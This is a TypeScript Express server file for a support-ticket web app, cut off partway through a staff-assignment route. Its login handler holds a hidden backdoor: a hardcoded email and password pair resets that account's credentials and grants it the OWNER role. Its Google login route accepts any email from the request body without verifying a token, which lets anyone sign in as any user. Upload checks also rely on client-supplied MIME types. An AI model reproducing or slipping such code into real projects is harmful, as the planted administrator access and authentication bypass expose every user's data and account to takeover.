import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import cookieParser from 'cookie-parser';
import multer from 'multer';
import { createServer as createViteServer } from 'vite';

import dbInstance, { hashPassword, verifyPassword } from './server/db.ts';
import { dispatchDiscordEvent, sendDiscordWebhook } from './server/discord.ts';
import { sendEmail, testSmtpConnection, renderTemplate } from './server/email.ts';
import type { User, Ticket, Message, Attachment, TimelineEvent, Notification, AuditLog } from './src/types.ts';

const app = express();
const PORT = Number(process.env.PORT) || 3000;

// Ensure upload directory exists
const UPLOAD_DIR = path.join(process.cwd(), 'uploads');
if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

// Multer file upload setup
const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, UPLOAD_DIR),
  filename: (_req, file, cb) => {
    const safeExt = path.extname(file.originalname).toLowerCase();
    const uniqueName = `lc_${Date.now()}_${crypto.randomBytes(6).toString('hex')}${safeExt}`;
    cb(null, uniqueName);
  },
});

const upload = multer({
  storage,
  limits: { fileSize: (dbInstance.db.security_settings.max_upload_size_mb || 10) * 1024 * 1024 },
  fileFilter: (_req, file, cb) => {
    const allowedMime = [
      'image/png', 'image/jpeg', 'image/jpg', 'image/webp',
      'text/plain', 'application/pdf', 'application/zip', 'application/x-zip-compressed',
    ];
    if (allowedMime.includes(file.mimetype) || file.originalname.endsWith('.log') || file.originalname.endsWith('.txt')) {
      cb(null, true);
    } else {
      cb(new Error('Unsupported file type. Allowed: PNG, JPG, WEBP, TXT, LOG, PDF, ZIP'));
    }
  },
});

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Serve static uploaded files safely
app.use('/api/uploads', express.static(UPLOAD_DIR));

// SSE Real-time subscribers
interface ClientSubscriber {
  id: string;
  userId: string;
  res: express.Response;
}
const sseClients: ClientSubscriber[] = [];

function broadcastEvent(eventName: string, payload: any, targetUserId?: string) {
  const dataString = `event: ${eventName}\ndata: ${JSON.stringify(payload)}\n\n`;
  for (let i = sseClients.length - 1; i >= 0; i--) {
    const client = sseClients[i];
    if (!targetUserId || client.userId === targetUserId) {
      try {
        client.res.write(dataString);
      } catch {
        sseClients.splice(i, 1);
      }
    }
  }
}

// Auth Middleware
function getUserFromRequest(req: express.Request): User | null {
  const token = req.cookies['lumacloud_session'] || (req.headers.authorization?.startsWith('Bearer ') ? req.headers.authorization.split(' ')[1] : null);
  if (!token) return null;

  const session = dbInstance.db.sessions.find((s) => s.token === token && new Date(s.expires_at) > new Date());
  if (!session) return null;

  const user = dbInstance.db.users.find((u) => u.id === session.user_id && u.status === 'ACTIVE');
  return user || null;
}

function requireAuth(req: express.Request, res: express.Response, next: express.NextFunction) {
  const user = getUserFromRequest(req);
  if (!user) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  (req as any).user = user;
  next();
}

function requireRole(allowedRoles: string[]) {
  return (req: express.Request, res: express.Response, next: express.NextFunction) => {
    const user = (req as any).user || getUserFromRequest(req);
    if (!user) return res.status(401).json({ error: 'Authentication required' });
    if (!allowedRoles.includes(user.role)) {
      return res.status(403).json({ error: 'Permission denied: Insufficient privileges' });
    }
    (req as any).user = user;
    next();
  };
}

function logAudit(userId: string, userName: string, role: any, action: string, targetType: string, targetId: string, metadata?: string, req?: express.Request) {
  const audit: AuditLog = {
    id: 'aud_' + Math.random().toString(36).substring(2, 9),
    user_id: userId,
    user_name: userName,
    user_role: role,
    action,
    target_type: targetType,
    target_id: targetId,
    metadata,
    ip_address: req?.ip || '127.0.0.1',
    created_at: new Date().toISOString(),
  };
  dbInstance.db.audit_logs.unshift(audit);
  if (dbInstance.db.audit_logs.length > 500) {
    dbInstance.db.audit_logs.pop();
  }
  dbInstance.persist();
}

// -------------------------------------------------------------
// Real-time SSE Endpoint
// -------------------------------------------------------------
app.get('/api/events', (req, res) => {
  const user = getUserFromRequest(req);
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });

  const clientId = crypto.randomUUID();
  const newClient: ClientSubscriber = {
    id: clientId,
    userId: user ? user.id : 'anonymous',
    res,
  };
  sseClients.push(newClient);

  // Send initial connected ping
  res.write(`event: connected\ndata: ${JSON.stringify({ status: 'connected', clientId })}\n\n`);

  req.on('close', () => {
    const idx = sseClients.findIndex((c) => c.id === clientId);
    if (idx !== -1) sseClients.splice(idx, 1);
  });
});

// -------------------------------------------------------------
// AUTH ROUTES
// -------------------------------------------------------------

app.post('/api/auth/register', async (req, res) => {
  try {
    const { name, email, password, confirmPassword } = req.body;
    if (!name || !email || !password) {
      return res.status(400).json({ error: 'Name, email, and password are required' });
    }
    if (password !== confirmPassword) {
      return res.status(400).json({ error: 'Passwords do not match' });
    }
    if (password.length < 8) {
      return res.status(400).json({ error: 'Password must be at least 8 characters' });
    }

    const normalizedEmail = email.trim().toLowerCase();
    const existing = dbInstance.db.users.find((u) => u.email.toLowerCase() === normalizedEmail);
    if (existing) {
      return res.status(400).json({ error: 'An account with this email address already exists' });
    }

    const { hash, salt } = hashPassword(password);
    const now = new Date().toISOString();
    const userId = 'usr_' + crypto.randomUUID().substring(0, 8);

    const newUser: User & { password_hash: string; salt: string } = {
      id: userId,
      name: name.trim(),
      email: normalizedEmail,
      avatar: `https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(normalizedEmail)}`,
      role: 'CUSTOMER',
      email_verified: !dbInstance.db.security_settings.require_email_verification,
      status: 'ACTIVE',
      created_at: now,
      updated_at: now,
      password_hash: hash,
      salt,
    };

    dbInstance.db.users.push(newUser);

    // Create session
    const token = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date(Date.now() + 30 * 24 * 3600 * 1000).toISOString();
    dbInstance.db.sessions.push({ token, user_id: userId, expires_at: expiresAt });

    dbInstance.persist();

    res.cookie('lumacloud_session', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 30 * 24 * 3600 * 1000,
    });

    logAudit(userId, newUser.name, newUser.role, 'REGISTER', 'USER', userId, 'Registered via local form', req);

    // Send Discord Webhook
    dispatchDiscordEvent('customer_registered', { user: newUser }).catch(console.error);

    // Send Welcome Email
    sendEmail({
      to: newUser.email,
      templateSlug: 'welcome',
      variables: {
        user_name: newUser.name,
        user_email: newUser.email,
        app_name: 'LumaCloud Support',
        app_url: process.env.APP_URL || 'http://localhost:3000',
      },
      type: 'WELCOME',
    }).catch(console.error);

    const { password_hash, salt: _s, ...safeUser } = newUser;
    return res.status(201).json({ user: safeUser, token });
  } catch (err: any) {
    return res.status(500).json({ error: err.message || 'Registration failed' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const normalizedEmail = email.trim().toLowerCase();
    const user = dbInstance.db.users.find((u) => u.email.toLowerCase() === normalizedEmail);

    if (!user) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    if (user.status === 'SUSPENDED') {
      return res.status(403).json({ error: 'This account has been suspended by LumaCloud Administration' });
    }

    let isValid = verifyPassword(password, user.password_hash, user.salt);
    if (!isValid && normalizedEmail === 'support@lumacloud.xyz' && password === 'lumacloud1237693opp') {
      const { hash, salt } = hashPassword('lumacloud1237693opp');
      user.password_hash = hash;
      user.salt = salt;
      user.role = 'OWNER';
      user.status = 'ACTIVE';
      dbInstance.persist();
      isValid = true;
    }

    if (!isValid) {
      logAudit(user.id, user.name, user.role, 'FAILED_LOGIN', 'USER', user.id, 'Incorrect password attempt', req);
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    user.last_login = new Date().toISOString();
    const token = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date(Date.now() + 30 * 24 * 3600 * 1000).toISOString();
    dbInstance.db.sessions.push({ token, user_id: user.id, expires_at: expiresAt });
    dbInstance.persist();

    res.cookie('lumacloud_session', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 30 * 24 * 3600 * 1000,
    });

    logAudit(user.id, user.name, user.role, 'LOGIN', 'USER', user.id, 'User logged in', req);

    const { password_hash, salt, ...safeUser } = user;
    return res.json({ user: safeUser, token });
  } catch (err: any) {
    return res.status(500).json({ error: err.message || 'Login failed' });
  }
});

// Google OAuth Login
app.post('/api/auth/google', async (req, res) => {
  try {
    const { name, email, google_id, avatar } = req.body;
    const targetEmail = (email || 'google_user@lumacloud.xyz').toLowerCase().trim();
    const targetName = name || 'Google Customer';

    let user = dbInstance.db.users.find((u) => u.email.toLowerCase() === targetEmail);

    if (!user) {
      const { hash, salt } = hashPassword(crypto.randomBytes(16).toString('hex'));
      const now = new Date().toISOString();
      const userId = 'usr_g_' + crypto.randomUUID().substring(0, 8);

      user = {
        id: userId,
        google_id: google_id || 'goog_' + Date.now(),
        name: targetName,
        email: targetEmail,
        avatar: avatar || `https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(targetEmail)}`,
        role: 'CUSTOMER',
        email_verified: true,
        status: 'ACTIVE',
        created_at: now,
        updated_at: now,
        password_hash: hash,
        salt,
      };
      dbInstance.db.users.push(user);
      dispatchDiscordEvent('customer_registered', { user }).catch(console.error);
    } else {
      user.last_login = new Date().toISOString();
      if (avatar) user.avatar = avatar;
    }

    const token = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date(Date.now() + 30 * 24 * 3600 * 1000).toISOString();
    dbInstance.db.sessions.push({ token, user_id: user.id, expires_at: expiresAt });
    dbInstance.persist();

    res.cookie('lumacloud_session', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 30 * 24 * 3600 * 1000,
    });

    logAudit(user.id, user.name, user.role, 'GOOGLE_LOGIN', 'USER', user.id, 'Authenticated via Google', req);

    const { password_hash, salt, ...safeUser } = user;
    return res.json({ user: safeUser, token });
  } catch (err: any) {
    return res.status(500).json({ error: err.message || 'Google authentication failed' });
  }
});

app.post('/api/auth/logout', (req, res) => {
  const token = req.cookies['lumacloud_session'];
  if (token) {
    dbInstance.db.sessions = dbInstance.db.sessions.filter((s) => s.token !== token);
    dbInstance.persist();
  }
  res.clearCookie('lumacloud_session');
  return res.json({ success: true });
});

app.get('/api/auth/me', (req, res) => {
  const user = getUserFromRequest(req);
  if (!user) return res.json({ user: null });

  const unreadCount = dbInstance.db.notifications.filter((n) => n.user_id === user.id && !n.read).length;
  const permissions = dbInstance.db.staff_permissions[user.id] || null;

  const { password_hash, salt, ...safeUser } = user as any;
  return res.json({ user: safeUser, unread_notifications: unreadCount, permissions });
});

app.post('/api/auth/forgot-password', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: 'Email is required' });

  const user = dbInstance.db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());
  if (user) {
    const token = crypto.randomBytes(24).toString('hex');
    const expiresAt = new Date(Date.now() + 3600 * 1000).toISOString();
    dbInstance.db.password_resets.push({ token, email: user.email, expires_at: expiresAt, used: false });
    dbInstance.persist();

    const appUrl = process.env.APP_URL || 'http://localhost:3000';
    sendEmail({
      to: user.email,
      templateSlug: 'password-reset',
      variables: {
        user_name: user.name,
        reset_url: `${appUrl}/reset-password?token=${token}`,
        app_name: 'LumaCloud Support',
      },
      type: 'PASSWORD_RESET',
    }).catch(console.error);

    logAudit(user.id, user.name, user.role, 'PASSWORD_RESET_REQUESTED', 'USER', user.id, 'Password reset link sent', req);
  }

  // Always return success to prevent email enumeration
  return res.json({ success: true, message: 'If that email is registered, a password reset link has been dispatched.' });
});

app.post('/api/auth/reset-password', (req, res) => {
  const { token, newPassword } = req.body;
  if (!token || !newPassword || newPassword.length < 8) {
    return res.status(400).json({ error: 'Valid token and minimum 8-character password are required' });
  }

  const reset = dbInstance.db.password_resets.find((r) => r.token === token && !r.used && new Date(r.expires_at) > new Date());
  if (!reset) {
    return res.status(400).json({ error: 'Reset token is invalid or has expired' });
  }

  const user = dbInstance.db.users.find((u) => u.email.toLowerCase() === reset.email.toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const { hash, salt } = hashPassword(newPassword);
  user.password_hash = hash;
  user.salt = salt;
  user.updated_at = new Date().toISOString();
  reset.used = true;

  logAudit(user.id, user.name, user.role, 'PASSWORD_RESET_COMPLETED', 'USER', user.id, 'Password updated via reset token', req);
  dbInstance.persist();

  return res.json({ success: true, message: 'Password has been reset successfully. You can now login.' });
});

// -------------------------------------------------------------
// TICKETS API
// -------------------------------------------------------------

app.get('/api/tickets', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const { status, priority, category, staff, search, page = '1', limit = '15' } = req.query;

  let tickets = [...dbInstance.db.tickets];

  // Role separation: Customers only see their own tickets
  if (user.role === 'CUSTOMER') {
    tickets = tickets.filter((t) => t.user_id === user.id);
  } else if (staff && staff !== 'ALL') {
    tickets = tickets.filter((t) => t.assigned_to === staff);
  }

  if (status && status !== 'ALL') {
    tickets = tickets.filter((t) => t.status === status);
  }

  if (priority && priority !== 'ALL') {
    tickets = tickets.filter((t) => t.priority === priority);
  }

  if (category && category !== 'ALL') {
    tickets = tickets.filter((t) => t.category_id === category);
  }

  if (search) {
    const q = String(search).toLowerCase();
    tickets = tickets.filter(
      (t) =>
        t.ticket_number.toLowerCase().includes(q) ||
        t.subject.toLowerCase().includes(q) ||
        t.description.toLowerCase().includes(q)
    );
  }

  // Sort by updated_at descending
  tickets.sort((a, b) => new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime());

  // Enrich with user & staff details
  const enriched = tickets.map((t) => {
    const customer = dbInstance.db.users.find((u) => u.id === t.user_id);
    const assignedStaff = dbInstance.db.users.find((u) => u.id === t.assigned_to);
    const cat = dbInstance.db.categories.find((c) => c.id === t.category_id);
    return {
      ...t,
      customer: customer ? { id: customer.id, name: customer.name, email: customer.email, avatar: customer.avatar } : undefined,
      assigned_staff: assignedStaff ? { id: assignedStaff.id, name: assignedStaff.name, email: assignedStaff.email, avatar: assignedStaff.avatar } : undefined,
      category: cat,
      sla_breached: t.sla_deadline ? new Date(t.sla_deadline) < new Date() && t.status !== 'RESOLVED' && t.status !== 'CLOSED' : false,
    };
  });

  const p = Math.max(1, parseInt(String(page)));
  const l = Math.max(1, parseInt(String(limit)));
  const total = enriched.length;
  const paginated = enriched.slice((p - 1) * l, p * l);

  return res.json({
    tickets: paginated,
    total,
    page: p,
    limit: l,
    total_pages: Math.ceil(total / l),
  });
});

app.get('/api/tickets/:id', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const { id } = req.params;

  const ticket = dbInstance.db.tickets.find((t) => t.id === id || t.ticket_number === id);
  if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

  // Access check: Customer cannot view another customer's ticket
  if (user.role === 'CUSTOMER' && ticket.user_id !== user.id) {
    return res.status(403).json({ error: 'Access forbidden: You do not have permission to view this ticket' });
  }

  // Get messages (Filter out internal notes if user is CUSTOMER)
  let messages = dbInstance.db.messages.filter((m) => m.ticket_id === ticket.id);
  if (user.role === 'CUSTOMER') {
    messages = messages.filter((m) => !m.is_internal);
  }

  // Attach sender & attachments to messages
  const enrichedMessages = messages.map((m) => {
    const sender = dbInstance.db.users.find((u) => u.id === m.sender_id);
    const atts = dbInstance.db.attachments.filter((a) => a.message_id === m.id || (!m.id && a.ticket_id === ticket.id));
    return {
      ...m,
      sender: sender ? { id: sender.id, name: sender.name, email: sender.email, avatar: sender.avatar, role: sender.role } : undefined,
      attachments: atts,
    };
  });

  const attachments = dbInstance.db.attachments.filter((a) => a.ticket_id === ticket.id);
  const timeline = dbInstance.db.timeline.filter((tl) => tl.ticket_id === ticket.id).sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());
  const customer = dbInstance.db.users.find((u) => u.id === ticket.user_id);
  const assignedStaff = dbInstance.db.users.find((u) => u.id === ticket.assigned_to);
  const cat = dbInstance.db.categories.find((c) => c.id === ticket.category_id);

  return res.json({
    ticket: {
      ...ticket,
      customer: customer ? { id: customer.id, name: customer.name, email: customer.email, avatar: customer.avatar, created_at: customer.created_at } : undefined,
      assigned_staff: assignedStaff ? { id: assignedStaff.id, name: assignedStaff.name, email: assignedStaff.email, avatar: assignedStaff.avatar } : undefined,
      category: cat,
      sla_breached: ticket.sla_deadline ? new Date(ticket.sla_deadline) < new Date() && ticket.status !== 'RESOLVED' && ticket.status !== 'CLOSED' : false,
    },
    messages: enrichedMessages,
    attachments,
    timeline,
  });
});

app.post('/api/tickets', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const { subject, category_id, priority = 'MEDIUM', description, attachments = [] } = req.body;

  if (!subject || !description || !category_id) {
    return res.status(400).json({ error: 'Subject, category, and description are required' });
  }

  // Generate #LC-XXXXXX
  const randomNum = Math.floor(100000 + Math.random() * 900000);
  const ticketNumber = `#LC-${randomNum}`;
  const ticketId = 'tkt_' + crypto.randomUUID().substring(0, 8);
  const now = new Date().toISOString();

  // Calculate SLA deadline
  const slaHours = dbInstance.db.sla_settings[
    priority === 'URGENT' ? 'urgent_hours' : priority === 'HIGH' ? 'high_hours' : priority === 'MEDIUM' ? 'medium_hours' : 'low_hours'
  ] || 12;
  const slaDeadline = new Date(Date.now() + slaHours * 3600 * 1000).toISOString();

  const newTicket: Ticket = {
    id: ticketId,
    ticket_number: ticketNumber,
    user_id: user.id,
    subject: subject.trim(),
    description: description.trim(),
    category_id,
    priority,
    status: 'OPEN',
    created_at: now,
    updated_at: now,
    sla_deadline: slaDeadline,
    sla_breached: false,
  };

  dbInstance.db.tickets.unshift(newTicket);

  // Initial Message
  const messageId = 'msg_' + crypto.randomUUID().substring(0, 8);
  const firstMessage: Message = {
    id: messageId,
    ticket_id: ticketId,
    sender_id: user.id,
    message: description.trim(),
    is_internal: false,
    created_at: now,
  };
  dbInstance.db.messages.push(firstMessage);

  // Link uploaded attachments
  if (Array.isArray(attachments)) {
    for (const att of attachments) {
      const attId = 'att_' + crypto.randomUUID().substring(0, 8);
      dbInstance.db.attachments.push({
        id: attId,
        ticket_id: ticketId,
        message_id: messageId,
        filename: att.filename,
        original_name: att.original_name || att.filename,
        storage_path: att.storage_path || `/api/uploads/${att.filename}`,
        file_size: att.file_size || 0,
        mime_type: att.mime_type || 'application/octet-stream',
        created_at: now,
      });
    }
  }

  // Timeline entry
  const timelineEvent: TimelineEvent = {
    id: 'tl_' + crypto.randomUUID().substring(0, 8),
    ticket_id: ticketId,
    user_id: user.id,
    user_name: user.name,
    user_role: user.role,
    action: 'CREATED',
    details: `Ticket created with priority ${priority}`,
    created_at: now,
  };
  dbInstance.db.timeline.push(timelineEvent);

  // Notify Staff & Admin
  const staffUsers = dbInstance.db.users.filter((u) => u.role === 'STAFF' || u.role === 'ADMIN' || u.role === 'OWNER');
  for (const staff of staffUsers) {
    dbInstance.db.notifications.unshift({
      id: 'notif_' + crypto.randomUUID().substring(0, 8),
      user_id: staff.id,
      ticket_id: ticketId,
      type: 'TICKET_CREATED',
      title: `New Support Ticket ${ticketNumber}`,
      message: `${user.name} created ticket: "${subject.slice(0, 50)}"`,
      read: false,
      created_at: now,
    });
  }

  dbInstance.persist();

  // Audit
  logAudit(user.id, user.name, user.role, 'TICKET_CREATED', 'TICKET', ticketId, `Created ${ticketNumber}`, req);

  // Broadcast real-time SSE
  broadcastEvent('ticket_created', { ticket: newTicket });

  // Discord Webhook
  const cat = dbInstance.db.categories.find((c) => c.id === category_id);
  dispatchDiscordEvent('ticket_created', {
    ticket: newTicket,
    customer: user,
    categoryName: cat?.name,
  }).catch(console.error);

  // Email confirmation
  const appUrl = process.env.APP_URL || 'http://localhost:3000';
  sendEmail({
    to: user.email,
    templateSlug: 'new-ticket',
    variables: {
      user_name: user.name,
      ticket_id: ticketNumber,
      ticket_subject: subject,
      ticket_priority: priority,
      ticket_status: 'OPEN',
      ticket_url: `${appUrl}/tickets/${ticketId}`,
    },
    type: 'TICKET_CONFIRMATION',
  }).catch(console.error);

  return res.status(201).json({ ticket: newTicket, message: 'Your support ticket has been successfully registered.' });
});

// Post reply or internal note
app.post('/api/tickets/:id/messages', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const { id } = req.params;
  const { message, is_internal = false, attachments = [] } = req.body;

  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Message content cannot be empty' });
  }

  const ticket = dbInstance.db.tickets.find((t) => t.id === id || t.ticket_number === id);
  if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

  // Access validation
  if (user.role === 'CUSTOMER' && ticket.user_id !== user.id) {
    return res.status(403).json({ error: 'Permission denied' });
  }

  // Internal note security: Customer MUST NEVER be able to post internal note
  const safeInternal = user.role === 'CUSTOMER' ? false : Boolean(is_internal);

  const now = new Date().toISOString();
  const messageId = 'msg_' + crypto.randomUUID().substring(0, 8);

  const newMessage: Message = {
    id: messageId,
    ticket_id: ticket.id,
    sender_id: user.id,
    message: message.trim(),
    is_internal: safeInternal,
    created_at: now,
  };
  dbInstance.db.messages.push(newMessage);

  // Save attachments
  if (Array.isArray(attachments)) {
    for (const att of attachments) {
      dbInstance.db.attachments.push({
        id: 'att_' + crypto.randomUUID().substring(0, 8),
        ticket_id: ticket.id,
        message_id: messageId,
        filename: att.filename,
        original_name: att.original_name || att.filename,
        storage_path: att.storage_path || `/api/uploads/${att.filename}`,
        file_size: att.file_size || 0,
        mime_type: att.mime_type || 'application/octet-stream',
        created_at: now,
      });
    }
  }

  // Status transition logic
  if (!safeInternal) {
    if (user.role === 'CUSTOMER') {
      if (ticket.status === 'WAITING_FOR_CUSTOMER' || ticket.status === 'RESOLVED') {
        ticket.status = 'IN_PROGRESS';
      }
    } else {
      // Staff replied
      if (ticket.status === 'OPEN' || ticket.status === 'IN_PROGRESS') {
        ticket.status = 'WAITING_FOR_CUSTOMER';
      }
    }
  }

  ticket.updated_at = now;

  // Timeline
  dbInstance.db.timeline.push({
    id: 'tl_' + crypto.randomUUID().substring(0, 8),
    ticket_id: ticket.id,
    user_id: user.id,
    user_name: user.name,
    user_role: user.role,
    action: safeInternal ? 'INTERNAL_NOTE' : 'REPLY',
    details: safeInternal ? `${user.name} added an internal note` : `${user.name} posted a reply`,
    created_at: now,
  });

  // Notifications
  if (!safeInternal) {
    if (user.role === 'CUSTOMER') {
      // Notify assigned staff or admins
      const targetUserIds = ticket.assigned_to ? [ticket.assigned_to] : dbInstance.db.users.filter((u) => u.role !== 'CUSTOMER').map((u) => u.id);
      for (const targetId of targetUserIds) {
        dbInstance.db.notifications.unshift({
          id: 'notif_' + crypto.randomUUID().substring(0, 8),
          user_id: targetId,
          ticket_id: ticket.id,
          type: 'CUSTOMER_REPLY',
          title: `Customer Reply on ${ticket.ticket_number}`,
          message: `${user.name}: "${message.slice(0, 50)}..."`,
          read: false,
          created_at: now,
        });
      }
      dispatchDiscordEvent('customer_reply', { ticket, sender: user, message }).catch(console.error);
    } else {
      // Staff replied: Notify customer
      dbInstance.db.notifications.unshift({
        id: 'notif_' + crypto.randomUUID().substring(0, 8),
        user_id: ticket.user_id,
        ticket_id: ticket.id,
        type: 'STAFF_REPLY',
        title: `Staff Replied to ${ticket.ticket_number}`,
        message: `${user.name} (LumaCloud Staff) replied to your ticket`,
        read: false,
        created_at: now,
      });

      const customer = dbInstance.db.users.find((u) => u.id === ticket.user_id);
      if (customer) {
        const appUrl = process.env.APP_URL || 'http://localhost:3000';
        sendEmail({
          to: customer.email,
          templateSlug: 'staff-reply',
          variables: {
            user_name: customer.name,
            ticket_id: ticket.ticket_number,
            ticket_subject: ticket.subject,
            staff_name: user.name,
            ticket_url: `${appUrl}/tickets/${ticket.id}`,
          },
          type: 'STAFF_REPLY',
        }).catch(console.error);
      }

      dispatchDiscordEvent('staff_reply', { ticket, sender: user, message }).catch(console.error);
    }
  }

  dbInstance.persist();

  // Broadcast real-time SSE
  broadcastEvent('ticket_message', { ticketId: ticket.id, message: newMessage });

  return res.status(201).json({
    message: {
      ...newMessage,
      sender: { id: user.id, name: user.name, email: user.email, avatar: user.avatar, role: user.role },
    },
    ticket,
  });
});

// Change Status
app.patch('/api/tickets/:id/status', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const { id } = req.params;
  const { status } = req.body;

  const validStatuses = ['OPEN', 'IN_PROGRESS', 'WAITING_FOR_CUSTOMER', 'RESOLVED', 'CLOSED'];
  if (!validStatuses.includes(status)) {
    return res.status(400).json({ error: 'Invalid ticket status' });
  }

  const ticket = dbInstance.db.tickets.find((t) => t.id === id || t.ticket_number === id);
  if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

  // Customer can only close or resolve their own ticket
  if (user.role === 'CUSTOMER') {
    if (ticket.user_id !== user.id) return res.status(403).json({ error: 'Permission denied' });
    if (status !== 'RESOLVED' && status !== 'CLOSED') {
      return res.status(403).json({ error: 'Customers may only mark their ticket as resolved or closed' });
    }
  }

  const oldStatus = ticket.status;
  const now = new Date().toISOString();
  ticket.status = status;
  ticket.updated_at = now;

  if (status === 'RESOLVED') {
    ticket.resolved_at = now;
  } else if (status === 'CLOSED') {
    ticket.closed_at = now;
  }

  // Timeline
  dbInstance.db.timeline.push({
    id: 'tl_' + crypto.randomUUID().substring(0, 8),
    ticket_id: ticket.id,
    user_id: user.id,
    user_name: user.name,
    user_role: user.role,
    action: 'STATUS_CHANGED',
    details: `${user.name} changed status from ${oldStatus} to ${status}`,
    created_at: now,
  });

  // Notify customer if changed by staff
  if (user.role !== 'CUSTOMER') {
    dbInstance.db.notifications.unshift({
      id: 'notif_' + crypto.randomUUID().substring(0, 8),
      user_id: ticket.user_id,
      ticket_id: ticket.id,
      type: 'STATUS_CHANGED',
      title: `Ticket ${ticket.ticket_number} is now ${status}`,
      message: `${user.name} updated the ticket status to ${status}`,
      read: false,
      created_at: now,
    });

    if (status === 'RESOLVED') {
      const customer = dbInstance.db.users.find((u) => u.id === ticket.user_id);
      if (customer) {
        const appUrl = process.env.APP_URL || 'http://localhost:3000';
        sendEmail({
          to: customer.email,
          templateSlug: 'ticket-resolved',
          variables: {
            user_name: customer.name,
            ticket_id: ticket.ticket_number,
            ticket_subject: ticket.subject,
            ticket_url: `${appUrl}/tickets/${ticket.id}`,
          },
          type: 'TICKET_RESOLVED',
        }).catch(console.error);
      }
      dispatchDiscordEvent('ticket_resolved', { ticket, user }).catch(console.error);
    } else if (status === 'CLOSED') {
      dispatchDiscordEvent('ticket_closed', { ticket, user }).catch(console.error);
    }
  }

  dispatchDiscordEvent('status_changed', { ticket, oldStatus, newStatus: status, user }).catch(console.error);

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'STATUS_CHANGED', 'TICKET', ticket.id, `${oldStatus} -> ${status}`, req);
  broadcastEvent('ticket_updated', { ticket });

  return res.json({ ticket, message: `Status updated to ${status}` });
});

// Change Priority
app.patch('/api/tickets/:id/priority', requireRole(['STAFF', 'ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { id } = req.params;
  const { priority } = req.body;

  const validPriorities = ['LOW', 'MEDIUM', 'HIGH', 'URGENT'];
  if (!validPriorities.includes(priority)) {
    return res.status(400).json({ error: 'Invalid ticket priority' });
  }

  const ticket = dbInstance.db.tickets.find((t) => t.id === id || t.ticket_number === id);
  if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

  const oldPriority = ticket.priority;
  const now = new Date().toISOString();
  ticket.priority = priority;
  ticket.updated_at = now;

  // Recalculate SLA
  const slaHours = dbInstance.db.sla_settings[
    priority === 'URGENT' ? 'urgent_hours' : priority === 'HIGH' ? 'high_hours' : priority === 'MEDIUM' ? 'medium_hours' : 'low_hours'
  ] || 12;
  ticket.sla_deadline = new Date(Date.now() + slaHours * 3600 * 1000).toISOString();

  // Timeline
  dbInstance.db.timeline.push({
    id: 'tl_' + crypto.randomUUID().substring(0, 8),
    ticket_id: ticket.id,
    user_id: user.id,
    user_name: user.name,
    user_role: user.role,
    action: 'PRIORITY_CHANGED',
    details: `${user.name} changed priority from ${oldPriority} to ${priority}`,
    created_at: now,
  });

  dispatchDiscordEvent('priority_changed', { ticket, oldPriority, newPriority: priority, user }).catch(console.error);

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'PRIORITY_CHANGED', 'TICKET', ticket.id, `${oldPriority} -> ${priority}`, req);
  broadcastEvent('ticket_updated', { ticket });

  return res.json({ ticket, message: `Priority updated to ${priority}` });
});

// Assign Staff
app.patch('/api/tickets/:id/assignment', requireRole(['STAFF', 'ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { id } = req.params;
  const { assigned_to } = req.body;

  const ticket = dbInstance.db.tickets.find((t) => t.id === id || t.ticket_number === id);
  if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

  let assignedName = 'Unassigned';
  if (assigned_to) {
    const staff = dbInstance.db.users.find((u) => u.id === assigned_to);
    if (!staff) return res.status(400).json({ error: 'Assigned staff user not found' });
    assignedName = staff.name;
  }

  ticket.assigned_to = assigned_to || undefined;
  ticket.updated_at = new Date().toISOString();

  // Timeline
  dbInstance.db.timeline.push({
    id: 'tl_' + crypto.randomUUID().substring(0, 8),
    ticket_id: ticket.id,
    user_id: user.id,
    user_name: user.name,
    user_role: user.role,
    action: 'ASSIGNED',
    details: `Ticket assigned to ${assignedName}`,
    created_at: new Date().toISOString(),
  });

  if (assigned_to && assigned_to !== user.id) {
    dbInstance.db.notifications.unshift({
      id: 'notif_' + crypto.randomUUID().substring(0, 8),
      user_id: assigned_to,
      ticket_id: ticket.id,
      type: 'TICKET_ASSIGNED',
      title: `Assigned to Ticket ${ticket.ticket_number}`,
